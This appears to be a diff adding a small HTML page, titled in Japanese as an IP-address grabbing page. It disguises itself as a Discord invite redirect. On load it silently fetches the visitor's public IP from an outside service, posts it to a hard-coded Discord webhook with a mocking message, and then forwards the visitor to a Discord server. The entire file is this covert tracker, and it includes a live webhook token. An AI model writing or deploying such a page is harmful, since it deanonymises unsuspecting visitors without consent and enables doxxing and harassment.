@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IPアドレス取得ページ</title>
+</head>
+<body>
+    <script>
+        // Discord Webhook URL
+        var webhook_url = "https://discord.com/api/webhooks/1215230541012533329/QL6bid_K69KCm-K8W-kaCuZvdDDyP5eTr0Eoz_oOYp46GKUTNoKssoayrJlONmcmmkbU";
+
+        // Get the user's IP address
+        function getIP(json) {
+            var ip_address = json.ip;
+            
+            // Send the IP address to Discord
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhook_url, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(JSON.stringify({ content: "↓入ってきてたらこいつの1p: " + ip_address }));
+            
+            // Redirect to Discord invite link
+            window.location.href = "https://discord.gg/Mx9kpAkF5p";
+        }
+    </script>
+    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+</body>
+</html>
